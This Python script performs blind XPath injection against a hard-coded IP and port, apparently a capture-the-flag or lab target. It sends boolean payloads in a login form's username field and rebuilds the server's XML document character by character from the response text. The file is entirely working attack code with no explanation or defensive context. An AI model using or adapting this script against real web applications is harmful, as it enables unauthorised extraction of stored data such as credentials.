import requests

number = 1
number_char = 1
number_child = 0
document_structure = {}

char = {
    "a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z",
    "A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z",
    "0","1","2","3","4","5","6","7","8","9","\"","\'","{","}","[","]","!","?","(",")",".",",","&","@","/"
}
char_list = sorted(list(char))
http_proxy = "http://127.0.0.1:8080"
proxies = {
    "http": http_proxy
}

url = "http://94.237.57.237:43328/index.php"

def explore_nodes(parent_path="", node_index=1):
    global number, number_char, number_child, document_structure

    number = 1
    number_char = 1
    number_child = 0
    name_node = []
    index = 0

    # String-length of the node
    while True:
        print(f"Trying string-length {number} for {parent_path}/*[{node_index}]")
        payload1 = f"bbb' or string-length(name(/{parent_path}/*[{node_index}]))={number} and '1'='1"
        data1 = {'username': payload1, 'msg': 'bbb'}
        response = requests.post(url, data=data1, proxies=proxies)

        if "Message successfully sent" not in response.text:
            number += 1
            if number > 10:  # No more than 10 child nodes. Change if necessary.
                print(f"Breaking name-length check at {number} for {parent_path} - No more nodes found.")
                return
        else:
            print(f"string-length: {number} - CORRECT")
            break

    if number == 1:
        return  # No more nodes, stop.

    # Substring(name(node))
    while True:
        print(f"Trying {char_list[index]} for name of {parent_path}/*[{node_index}]")
        payload2 = f"bbb' or substring(name(/{parent_path}/*[{node_index}]),{number_char},1)='{char_list[index]}' and '1'='1"
        data2 = {'username': payload2, 'msg': 'bbb'}
        response = requests.post(url, data=data2, proxies=proxies)

        if number_char <= number and "Message successfully sent" not in response.text:
            index += 1
        elif number_char <= number and "Message successfully sent" in response.text:
            print(f"Added '{char_list[index]}' to name of {parent_path}/*[{node_index}]")
            name_node.append(char_list[index])
            number_char += 1
            index = 0
        else:
            break

        lista = ''.join(name_node)
        print("\033[1m" + "Node name: " + "\033[0m" + "\033[1m" + lista + "\033[0m")

    node_name = ''.join(name_node)
    full_path = f"{parent_path}/{node_name}" if parent_path else node_name

    # Add child node to parent node (ASCII stuff)
    if parent_path:
        document_structure[parent_path]["children"].append(full_path)

    document_structure[full_path] = {"children": [], "text": ""}

    # Count child nodes
    number_child = 0
    while True:
        print(f"Trying child count {number_child} for {full_path}")
        payload3 = f"bbb' or count(/{full_path}/*)={number_child} and '1'='1"
        data3 = {'username': payload3, 'msg': 'bbb'}
        response = requests.post(url, data=data3, proxies=proxies)

        if "Message successfully sent" not in response.text:
            number_child += 1
            if number_child > 10:  # No more than 10 child nodes. If you need, change this.
                print(f"Breaking child-count check at {number_child} for {full_path} - No more children found.")
                return
        else:
            print(f"\033[1mChild nodes of {full_path}: {number_child}\033[0m")
            break

    # If child nodes, explore them.
    if number_child > 0:
        for i in range(1, number_child + 1):
            explore_nodes(full_path, i)
          # Do not look for text nodes if there are still child nodes.

    # If node doesn't have child nodes, look for text nodes.
    value_length = 1
    while True:
        print(f"Trying text length {value_length} for {full_path}")
        payload4 = f"bbb' or string-length(/{full_path}/text())={value_length} and '1'='1"
        data4 = {'username': payload4, 'msg': 'bbb'}
        response = requests.post(url, data=data4, proxies=proxies)

        if "Message successfully sent" not in response.text:
            value_length += 1
            if value_length > 50:
                print(f"Breaking text-length check at {value_length} for {full_path} - No text found.")
                return
        else:
            print(f"Text length: {value_length} - CORRECT")
            break

    if value_length > 1:
        value = []
        for value_char_index in range(1, value_length + 1):
            found = False
            for candidate in char_list:
                print(f"Trying {full_path}/{''.join(value) + candidate}")
                payload5 = f"bbb' or substring(/{full_path}/text(),{value_char_index},1)='{candidate}' and '1'='1"
                data5 = {'username': payload5, 'msg': 'bbb'}
                response = requests.post(url, data=data5, proxies=proxies)
                if "Message successfully sent" in response.text:
                    print(f"Added '{candidate}' to {full_path}")
                    value.append(candidate)
                    found = True
                    break
            if not found:
                print(f"Didn't find char on the position {value_char_index} in {full_path}")
                break

        document_structure[full_path]["text"] = ''.join(value)


def print_ascii_document():
    """ Print document in ASCII """
    def recursive_print(node, indent=0):
        indent_str = " " * (indent * 2)
        text = document_structure[node]["text"]
        print(f"{indent_str}<{node.split('/')[-1]}>")
        if text:
            print(f"{indent_str}  {text}")
        for child in document_structure[node]["children"]:
            recursive_print(child, indent + 1)
        print(f"{indent_str}</{node.split('/')[-1]}>")

    if not document_structure:
        print("No XML structure found.")
        return

    root = list(document_structure.keys())[0]  
    recursive_print(root)

explore_nodes()

# ASCII Stuff
print("\n=== ASCII Representation of XML Document ===\n")
print_ascii_document()
